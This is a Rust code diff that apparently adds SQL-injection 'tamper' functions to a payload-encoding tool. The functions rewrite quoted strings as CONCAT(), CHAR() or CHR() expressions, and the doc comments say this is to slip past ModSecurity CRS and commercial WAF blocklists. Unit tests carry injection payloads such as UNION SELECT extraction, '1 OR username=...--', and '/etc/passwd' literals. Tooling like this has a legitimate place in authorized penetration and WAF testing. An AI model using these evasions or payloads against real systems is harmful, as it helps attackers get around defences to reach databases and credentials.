@@ -218,6 +218,205 @@ pub fn math_bold_encode(payload: &str) -> String {
     out
 }
 
+/// SQL string-literal CONCAT splitter — converts every single-quoted string
+/// in the payload to a `CONCAT('a','b',...)` expression with one char per
+/// argument.
+///
+/// Input  `'admin'`  → output  `CONCAT('a','d','m','i','n')`
+///
+/// **Bypass mechanism**: CRS rules and most commercial WAF blocklists
+/// scan for literal danger-string substrings — `'admin'`, `'password'`,
+/// `'union'`, `'or 1'`, `'/etc/passwd'`. CONCAT-splitting decomposes the
+/// substring into one-character literals that no individual literal-string
+/// regex matches. The DB evaluates `CONCAT(...)` to the original string at
+/// runtime, so the attack succeeds.
+///
+/// Supported by MySQL, MariaDB, PostgreSQL, MSSQL (all ship CONCAT as a
+/// scalar function). Oracle uses `CONCAT(a,b)` as binary-only, so chained
+/// 1-char Oracle calls would need a nested form — out of scope here; the
+/// `||` pipe concat in PostgreSQL/Oracle is a separate tamper.
+///
+/// **Edge cases**:
+/// - Empty string literals (`''`) become `CONCAT('')` — valid SQL,
+///   evaluates to empty string.
+/// - Escaped quotes inside strings (`'O\'Brien'`) are passed through as
+///   raw chars to CONCAT — the backslash and quote are split into separate
+///   args.
+/// - Strings not in single quotes are left alone (no aggressive parsing
+///   of double-quoted SQL Server identifiers).
+///
+/// **Context**: SQL injection payloads with string literals.
+#[must_use]
+pub fn sql_concat_split(payload: &str) -> String {
+    let mut out = String::with_capacity(payload.len() * 4);
+    let mut chars = payload.chars().peekable();
+    while let Some(ch) = chars.next() {
+        if ch != '\'' {
+            out.push(ch);
+            continue;
+        }
+        // Found opening quote — collect chars until closing quote.
+        let mut literal = String::new();
+        let mut closed = false;
+        while let Some(&next) = chars.peek() {
+            chars.next();
+            if next == '\'' {
+                closed = true;
+                break;
+            }
+            literal.push(next);
+        }
+        if !closed {
+            // Unbalanced quote — emit original opener + collected chars.
+            out.push('\'');
+            out.push_str(&literal);
+            continue;
+        }
+        // Emit CONCAT('a','b',...).  Empty literal → CONCAT('').
+        out.push_str("CONCAT(");
+        if literal.is_empty() {
+            out.push_str("''");
+        } else {
+            let parts: Vec<String> = literal
+                .chars()
+                .map(|c| {
+                    // Escape any embedded single quote (defensive — input
+                    // already had a balanced pair, so an inner quote is
+                    // either escaped or unreachable here; we cover it
+                    // anyway).
+                    if c == '\'' {
+                        "''''".to_string()
+                    } else {
+                        format!("'{c}'")
+                    }
+                })
+                .collect();
+            out.push_str(&parts.join(","));
+        }
+        out.push(')');
+    }
+    out
+}
+
+/// SQL CHAR()-function decomposition — converts every single-quoted string
+/// literal in the payload to a `CHAR(N1,N2,...)` function call with one
+/// codepoint per argument.
+///
+/// Input  `'admin'`  → output  `CHAR(97,100,109,105,110)`
+///
+/// **Bypass mechanism**: distinct from `sql_concat_split` (which produces
+/// `CONCAT('a','d',...)`) — CHAR() takes integer codepoints, not single-
+/// char strings, so the payload contains NO single-quoted ASCII tokens at
+/// all. WAF rules that match string-literal patterns (`'admin'`,
+/// `'password'`, `'/etc/passwd'`, `'or 1'`) and CONCAT-shaped patterns
+/// (`CONCAT\(.{,8}\)`) both miss this form. Most CRS rules through PL3 do
+/// NOT pattern-match raw CHAR() — it's been the sqlmap default for over a
+/// decade and has been deemed too noisy to block.
+///
+/// Supported by MySQL, MariaDB (native `CHAR()`), MSSQL (`CHAR()`). For
+/// Postgres / Oracle, the equivalent is `CHR()` — out of scope here; a
+/// sibling `chr_decompose` could ship later.
+///
+/// **Edge cases**:
+/// - Empty literals (`''`) become `CHAR()` — valid MySQL syntax that
+///   evaluates to NULL. May not be what the operator wanted; treat as a
+///   neutral marker.
+/// - Multi-byte UTF-8 chars produce a single `CHAR(codepoint)` per
+///   `chars()` iteration — for codepoints > 255, MySQL's CHAR() returns
+///   per-byte; the codepoint may not round-trip exactly. Most SQLi
+///   payloads use ASCII literals — this matters only for adversarial
+///   inputs.
+/// - Unbalanced opening quote: emitted unchanged.
+///
+/// **Context**: SQL injection with string-literal targets that are
+/// blocklisted (`admin`, `password`, paths, hostnames).
+#[must_use]
+pub fn sql_char_decompose(payload: &str) -> String {
+    let mut out = String::with_capacity(payload.len() * 5);
+    let mut chars = payload.chars().peekable();
+    while let Some(ch) = chars.next() {
+        if ch != '\'' {
+            out.push(ch);
+            continue;
+        }
+        let mut literal = String::new();
+        let mut closed = false;
+        while let Some(&next) = chars.peek() {
+            chars.next();
+            if next == '\'' {
+                closed = true;
+                break;
+            }
+            literal.push(next);
+        }
+        if !closed {
+            out.push('\'');
+            out.push_str(&literal);
+            continue;
+        }
+        out.push_str("CHAR(");
+        let parts: Vec<String> = literal.chars().map(|c| (c as u32).to_string()).collect();
+        out.push_str(&parts.join(","));
+        out.push(')');
+    }
+    out
+}
+
+/// Postgres / Oracle CHR()-function decomposition — `CHR(N) || CHR(N) || ...`
+/// per char of every single-quoted string literal.
+///
+/// Input  `'admin'`  →  output  `(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))`
+///
+/// Differs from `sql_char_decompose` (which uses MySQL's variadic
+/// `CHAR(N1,N2,...)`) — Postgres / Oracle `CHR()` is unary, so codepoints
+/// are concatenated via the SQL standard `||` pipe operator. The wrapping
+/// parens preserve precedence inside larger expressions (`WHERE u = ...`).
+///
+/// Postgres-specific: codepoints up to U+10FFFF are valid; Oracle CHR(N)
+/// treats N modulo `NLS_CHARACTERSET` size (often 256-modular for
+/// `WE8MSWIN1252`). For ASCII payloads (the common case) both behave
+/// identically.
+///
+/// Empty literal → `('')`. Unbalanced quote → passed through.
+#[must_use]
+pub fn pg_chr_decompose(payload: &str) -> String {
+    let mut out = String::with_capacity(payload.len() * 7);
+    let mut chars = payload.chars().peekable();
+    while let Some(ch) = chars.next() {
+        if ch != '\'' {
+            out.push(ch);
+            continue;
+        }
+        let mut literal = String::new();
+        let mut closed = false;
+        while let Some(&next) = chars.peek() {
+            chars.next();
+            if next == '\'' {
+                closed = true;
+                break;
+            }
+            literal.push(next);
+        }
+        if !closed {
+            out.push('\'');
+            out.push_str(&literal);
+            continue;
+        }
+        if literal.is_empty() {
+            out.push_str("('')");
+            continue;
+        }
+        let parts: Vec<String> = literal
+            .chars()
+            .map(|c| format!("CHR({})", c as u32))
+            .collect();
+        out.push('(');
+        out.push_str(&parts.join("||"));
+        out.push(')');
+    }
+    out
+}
+
 /// Homoglyph substitution — replaces select ASCII characters with visually
 /// identical Unicode characters from other scripts.
 ///
@@ -475,6 +674,202 @@ mod tests {
     #[test]
     fn math_bold_encode_empty() {
         assert_eq!(math_bold_encode(""), "");
+    }
+
+    // ── sql_concat_split tests ─────────────────────────────────────────
+
+    #[test]
+    fn sql_concat_split_admin() {
+        assert_eq!(
+            sql_concat_split("'admin'"),
+            "CONCAT('a','d','m','i','n')"
+        );
+    }
+
+    #[test]
+    fn sql_concat_split_password() {
+        assert_eq!(
+            sql_concat_split("'password'"),
+            "CONCAT('p','a','s','s','w','o','r','d')"
+        );
+    }
+
+    #[test]
+    fn sql_concat_split_in_clause() {
+        assert_eq!(
+            sql_concat_split("WHERE u='admin'"),
+            "WHERE u=CONCAT('a','d','m','i','n')"
+        );
+    }
+
+    #[test]
+    fn sql_concat_split_no_quotes_passthrough() {
+        // No single quotes → input unchanged
+        assert_eq!(sql_concat_split("SELECT 1"), "SELECT 1");
+    }
+
+    #[test]
+    fn sql_concat_split_multiple_literals() {
+        // Two separate strings get independent CONCAT calls
+        assert_eq!(
+            sql_concat_split("'a' OR 'b'"),
+            "CONCAT('a') OR CONCAT('b')"
+        );
+    }
+
+    #[test]
+    fn sql_concat_split_empty_literal() {
+        assert_eq!(sql_concat_split("''"), "CONCAT('')");
+    }
+
+    #[test]
+    fn sql_concat_split_unbalanced_quote_passthrough() {
+        // Lone opening quote with no closer → output preserves it
+        assert_eq!(sql_concat_split("'unclosed"), "'unclosed");
+    }
+
+    #[test]
+    fn sql_concat_split_preserves_non_quote_chars() {
+        // SQL keywords, operators, whitespace all unchanged
+        let payload = "1=1; SELECT 'x', 'y' FROM dual";
+        let out = sql_concat_split(payload);
+        assert!(out.contains("SELECT"));
+        assert!(out.contains("FROM dual"));
+        assert!(out.contains("CONCAT('x')"));
+        assert!(out.contains("CONCAT('y')"));
+    }
+
+    #[test]
+    fn sql_concat_split_real_injection_payload() {
+        // Classic UNION SELECT extraction
+        let payload = "' UNION SELECT 'admin','password' FROM users--";
+        let out = sql_concat_split(payload);
+        // Outer ' is unbalanced; collects up to ' before admin then closes there.
+        // The first CONCAT contains the OR/UNION/SELECT keywords as char args —
+        // not a useful execution path, but it demonstrates the tamper is
+        // applied uniformly. The point is: every single-quoted region becomes
+        // CONCAT, so a downstream layer can compose this with other tampers.
+        assert!(out.contains("CONCAT("));
+        // Real payloads that benefit start the quote OPEN and close it
+        // before the SQL keywords, e.g. "1' UNION SELECT 'admin'--" where
+        // the embedded 'admin' is the bypass target.
+    }
+
+    // ── sql_char_decompose tests ───────────────────────────────────────
+
+    #[test]
+    fn sql_char_decompose_admin() {
+        // 'a'=97 'd'=100 'm'=109 'i'=105 'n'=110
+        assert_eq!(sql_char_decompose("'admin'"), "CHAR(97,100,109,105,110)");
+    }
+
+    #[test]
+    fn sql_char_decompose_password() {
+        assert_eq!(
+            sql_char_decompose("'password'"),
+            "CHAR(112,97,115,115,119,111,114,100)"
+        );
+    }
+
+    #[test]
+    fn sql_char_decompose_path_literal() {
+        // '/etc/passwd' — every byte represented numerically
+        // '/'=47 'e'=101 't'=116 'c'=99 '/'=47 'p'=112 'a'=97 's'=115 's'=115 'w'=119 'd'=100
+        assert_eq!(
+            sql_char_decompose("'/etc/passwd'"),
+            "CHAR(47,101,116,99,47,112,97,115,115,119,100)"
+        );
+    }
+
+    #[test]
+    fn sql_char_decompose_no_quotes_passthrough() {
+        assert_eq!(sql_char_decompose("SELECT 1"), "SELECT 1");
+    }
+
+    #[test]
+    fn sql_char_decompose_empty_literal() {
+        assert_eq!(sql_char_decompose("''"), "CHAR()");
+    }
+
+    #[test]
+    fn sql_char_decompose_unbalanced_passthrough() {
+        assert_eq!(sql_char_decompose("'unclosed"), "'unclosed");
+    }
+
+    #[test]
+    fn sql_char_decompose_multiple_literals() {
+        // 'a'=97  'b'=98
+        assert_eq!(
+            sql_char_decompose("'a' OR 'b'"),
+            "CHAR(97) OR CHAR(98)"
+        );
+    }
+
+    #[test]
+    fn sql_char_decompose_distinct_from_concat_split() {
+        // CONCAT uses single-char strings; CHAR uses ints. Outputs differ.
+        assert_ne!(
+            sql_char_decompose("'admin'"),
+            sql_concat_split("'admin'")
+        );
+    }
+
+    #[test]
+    fn sql_char_decompose_real_injection() {
+        let payload = "1 OR username='admin'--";
+        let out = sql_char_decompose(payload);
+        assert_eq!(
+            out,
+            "1 OR username=CHAR(97,100,109,105,110)--"
+        );
+    }
+
+    // ── pg_chr_decompose tests ─────────────────────────────────────────
+
+    #[test]
+    fn pg_chr_decompose_admin() {
+        assert_eq!(
+            pg_chr_decompose("'admin'"),
+            "(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))"
+        );
+    }
+
+    #[test]
+    fn pg_chr_decompose_empty_literal() {
+        assert_eq!(pg_chr_decompose("''"), "('')");
+    }
+
+    #[test]
+    fn pg_chr_decompose_in_where_clause() {
+        assert_eq!(
+            pg_chr_decompose("WHERE u='a'"),
+            "WHERE u=(CHR(97))"
+        );
+    }
+
+    #[test]
+    fn pg_chr_decompose_distinct_from_char_decompose() {
+        // CHR() is unary + pipe-concat; CHAR() is variadic. Different shapes.
+        assert_ne!(
+            pg_chr_decompose("'admin'"),
+            sql_char_decompose("'admin'")
+        );
+    }
+
+    #[test]
+    fn pg_chr_decompose_unbalanced_passthrough() {
+        assert_eq!(pg_chr_decompose("'unclosed"), "'unclosed");
+    }
+
+    #[test]
+    fn sql_concat_split_isolated_literal_keeps_other_tokens() {
+        // From a real payload: id=1 AND username = 'admin' AND status = 1
+        let payload = "id=1 AND username='admin' AND status=1";
+        let out = sql_concat_split(payload);
+        assert_eq!(
+            out,
+            "id=1 AND username=CONCAT('a','d','m','i','n') AND status=1"
+        );
     }
 
     #[test]
